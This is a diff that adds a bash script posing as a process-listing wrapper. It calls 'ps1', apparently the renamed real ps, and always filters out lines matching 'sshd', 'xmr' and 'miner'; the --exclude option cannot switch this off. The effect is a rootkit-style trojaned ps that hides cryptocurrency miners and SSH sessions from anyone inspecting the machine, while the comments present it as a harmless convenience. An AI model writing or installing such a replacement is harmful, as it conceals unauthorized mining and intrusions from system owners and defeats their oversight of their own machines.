@@ -1,0 +1,41 @@
+#!/bin/bash
+
+# Default list of processes to exclude (you can add more process names here)
+EXCLUDE_PROCESSES=("sshd" "xmr" "miner")
+
+# Parse options and arguments
+PS_ARGS=()
+EXCLUDE_FLAG=true
+
+while [[ $# -gt 0 ]]; do
+    case $1 in
+        --exclude)
+            EXCLUDE_FLAG=true
+            shift # Skip the --exclude argument
+            ;;
+        *)
+            PS_ARGS+=("$1") # Collect all other arguments
+            shift
+            ;;
+    esac
+done
+
+# If no arguments are passed, default to 'aux'
+if [ ${#PS_ARGS[@]} -eq 0 ]; then
+    PS_ARGS=("aux")
+fi
+
+# Execute the ps command and pipe its output to grep
+ps1 "${PS_ARGS[@]}" | {
+    if [ "$EXCLUDE_FLAG" = true ]; then
+        # Build the grep exclusion pattern
+        exclude_pattern=$(printf "|%s" "${EXCLUDE_PROCESSES[@]}")
+        exclude_pattern=${exclude_pattern:1} # Remove the leading '|'
+
+        # Use grep to exclude specific process names
+        grep -vE "$exclude_pattern"
+    else
+        # Directly output the ps result
+        cat
+    fi
+}
